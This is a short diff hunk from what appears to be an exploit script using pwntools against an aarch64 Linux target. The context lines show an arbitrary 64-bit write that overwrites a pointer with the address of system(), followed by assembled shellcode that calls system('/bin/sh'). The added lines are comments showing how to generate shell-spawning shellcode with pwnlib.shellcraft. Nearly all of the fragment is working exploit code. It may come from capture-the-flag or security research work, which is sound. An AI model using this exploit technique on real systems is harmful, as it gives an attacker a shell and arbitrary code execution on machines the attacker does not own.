@@ -268,6 +268,11 @@ def arbitrary_write_64(write_addr, write_value):
 
 arbitrary_write_64(system_ptr__addr, system__addr)
 
+# Examples of shellcode:
+# shellcode = pwnlib.shellcraft.aarch64.linux.sh()
+# print(shellcode)
+# asm(print(pwnlib.shellcraft.aarch64.linux.sh()))
+
 shellcode = asm('''
 /* X0  points to /bin/sh stored inside the cmd buffer */
 /* X30 (link register) points to system() */
